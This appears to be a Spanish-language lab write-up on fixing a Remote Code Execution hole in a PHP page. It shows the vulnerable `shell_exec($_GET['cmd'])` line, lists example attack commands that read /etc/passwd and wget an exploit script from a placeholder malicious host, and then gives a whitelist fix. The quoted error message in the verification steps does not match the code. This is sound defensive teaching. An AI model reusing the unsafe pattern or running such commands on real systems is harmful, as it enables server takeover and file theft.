# Solución: Remote Code Execution (RCE)

## 1. Explicación de la Actividad
En esta actividad, he trabajado con una página vulnerable a ejecución de comandos arbitrarios del sistema, lo que permitía controlar el servidor.

## 2. Código Vulnerable (Original)
He observado que el código original permitía al usuario ejecutar cualquier comando del sistema a través de la entrada `cmd`:

```php
$output = shell_exec($_GET['cmd']);
echo $output;
```

Esto permitía ejecutar comandos como `cat /etc/passwd`, `wget malicioso.com/exploit.sh`, etc.

## 3. Corrección Aplicada
Para mitigar esta vulnerabilidad, he empleado una **Lista Blanca estricta** de comandos permitidos. Los comandos disponibles son únicamente `date` y `uptime`.

1.  **Definición de Comandos Permitidos:** He creado un array asociativo `$allowed_commands` con los comandos seguros.
2.  **Validación:** Verifico si el comando solicitado por el usuario (`cmd`) existe en las claves de esta lista.
3.  **Ejecución:** Solo permito la ejecución si el comando está explícitamente permitido.

```php
$allowed_commands = [
    'date' => 'date',
    'uptime' => 'uptime'
];

$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : '';

if (array_key_exists($cmd, $allowed_commands)) {
    // Ejecutar solo si está permitido
    $output = shell_exec($allowed_commands[$cmd]);
    echo "<pre>$output</pre>";
} else {
    echo "Error: Comando no permitido.";
}
```

## 4. Verificación
Para verificar la solución, he realizado los siguientes pasos:
1.  He visitado `re.php?cmd=date` y he comprobado que muestra la fecha correctamente.
2.  He intentado `re.php?cmd=ls` y `re.php?cmd=whoami`.
3.  He verificado que el sistema bloquea la ejecución del comando y muestra "Error: Comando no permitido o inválido".
